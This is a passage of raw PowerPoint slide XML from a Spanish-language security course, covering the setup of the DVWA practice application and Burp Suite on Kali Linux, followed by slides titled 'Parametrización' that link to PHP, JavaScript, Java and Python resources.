          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6234315" y="4086241"/>
            <a:ext cx="2705836" cy="2217282"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="19" name="Imagen 18">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9666E95D-B516-6009-6616-C6B2F0D10D3B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="9122510" y="4086241"/>
            <a:ext cx="2678773" cy="2217282"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="991312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11514" y="282116"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA – En máquina virtual – actualizar </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BurpSuite</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="CuadroTexto 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{186DE0B0-B221-66AD-CE16-AE8176BDA27E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311514" y="1064753"/>
            <a:ext cx="6094428" cy="4524315"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Finaliza la instalación</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Al abrir el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>burpsuite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> vemos que nos aparecen dos opciones. Escogemos la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>Comunity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>Edition</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>En la sección de Proxy/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>Intercept</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> podemos ver el browser. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Al abrirlo nos pide contraseña del </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>keyring</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>, le pongo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>kali</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>/Kali pero recomiendo dejarlo en blanco.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>El </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>keyring</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> es el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>keystore</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> del navegador en donde dejaremos las contraseñas y las claves públicas y privadas. Como todo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>keystore</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>, necesitará contraseña</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="21" name="Imagen 20">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{835134BD-910B-542C-F100-05CD7D6A35CB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8299696" y="673434"/>
            <a:ext cx="2670332" cy="2217282"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="23" name="Imagen 22">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9D3AF068-EBD2-F0E8-4DBE-E5CDB1E0CCDF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4986519" y="1879318"/>
            <a:ext cx="2838846" cy="1733792"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="25" name="Imagen 24">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CD95F282-A50B-D3CE-17D4-9B2A06800BE8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6659710" y="4004428"/>
            <a:ext cx="5163271" cy="1343212"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="27" name="Imagen 26">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0698F11C-7BB3-2C37-DD14-558D92073ED6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6986029" y="5386036"/>
            <a:ext cx="4510632" cy="1211647"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2514893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11514" y="282116"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA – En </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>kali</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Marcador de texto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C2B9077D-B9E7-1F6C-56B7-2EA1EBC05339}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="605009" y="1064753"/>
            <a:ext cx="10735436" cy="513823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lvl="0" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="7095CA"/>
              </a:buClr>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>La aplicación DVWA no funciona bien del todo, la descarto usar</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" indent="-342900" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="7095CA"/>
              </a:buClr>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>
            </a:pP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apt-get</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update</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sudo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apt</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install</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dvwa</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service</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mariadb</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restart</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dvwa-start</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dvwa</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-stop</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" indent="-342900" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="7095CA"/>
              </a:buClr>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Imagen 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B975CBF2-1B8B-67C5-857D-E1CF8C8AB489}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7135742" y="673434"/>
            <a:ext cx="3467584" cy="1276528"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Imagen 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CE69730C-6BF9-9FAE-D976-2508F914572A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4293093" y="2212194"/>
            <a:ext cx="6773220" cy="4382112"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3483062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435092" y="229220"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Práctica</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7171" name="Marcador de texto 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1654793" y="1404378"/>
            <a:ext cx="9343950" cy="4248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a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Instalar el DVWA</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Actualizar el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>BurpSuite</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="748044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ítulo 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1671070" y="2492067"/>
            <a:ext cx="8208838" cy="936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 altLang="es-ES" sz="5000" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Parametrización</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4233839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1487488" y="373385"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Parametrización</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7171" name="Marcador de texto 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="350487" y="1013755"/>
            <a:ext cx="5904656" cy="386933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p>
            <a:pPr marL="342900" lvl="0" indent="-342900" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="7095CA"/>
              </a:buClr>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>PHP: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0563C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>enlace</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="24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endParaRPr lang="es-ES" sz="24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endParaRPr lang="es-ES" sz="2400" dirty="0">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endParaRPr lang="es-ES" sz="24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endParaRPr lang="es-ES" sz="2400" dirty="0">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endParaRPr lang="es-ES" sz="24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2400" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>JavaScript: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0563C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>enlace</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="3600" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Imagen 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FB8C80D0-003F-5DE6-24F0-8BE333E21562}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4453349" y="4344771"/>
            <a:ext cx="6773220" cy="1581371"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Imagen 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AB110145-6EA4-323A-AF55-F93DD1BA1633}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4453349" y="1276639"/>
            <a:ext cx="7617891" cy="2473180"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2232291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1487488" y="373385"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Parametrización</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7171" name="Marcador de texto 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="350487" y="1013755"/>
            <a:ext cx="5904656" cy="313707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2900" lvl="0" indent="-342900" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="7095CA"/>
              </a:buClr>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Java: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0563C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>enlace</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="24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endParaRPr lang="es-ES" sz="24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endParaRPr lang="es-ES" sz="2400" dirty="0">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2400" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Python: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2400" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0563C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>enlace</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="2400" dirty="0">
              <a:effectLst/>
              <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Imagen 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C58C5CB1-9685-4004-BE4D-D75D2E2CA56C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
